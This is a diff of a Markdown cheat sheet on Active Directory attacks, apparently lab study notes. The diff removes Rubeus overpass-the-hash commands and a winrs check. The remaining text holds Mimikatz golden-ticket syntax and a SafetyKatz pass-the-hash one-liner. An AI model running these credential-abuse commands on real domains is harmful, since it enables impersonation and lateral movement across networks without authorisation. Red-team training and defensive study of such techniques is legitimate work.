@@ -21,16 +21,6 @@ kerberos::golden /user: /domain: /sid: /krbtgt: /id:
 ```
 
 ### **OVERPASS THE HASH**
-```powershell
-rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
-```
-```cmd
-Rubeus.exe asktgt /user:<USER> /aes256:<HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-```
-Use winrs to test
-```powershell
-winrs -r:dcorp-dc whoami
-```
 *Using SafetyKatz*
 ```powershell
 .\SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /run:cmd.exe" "exit"
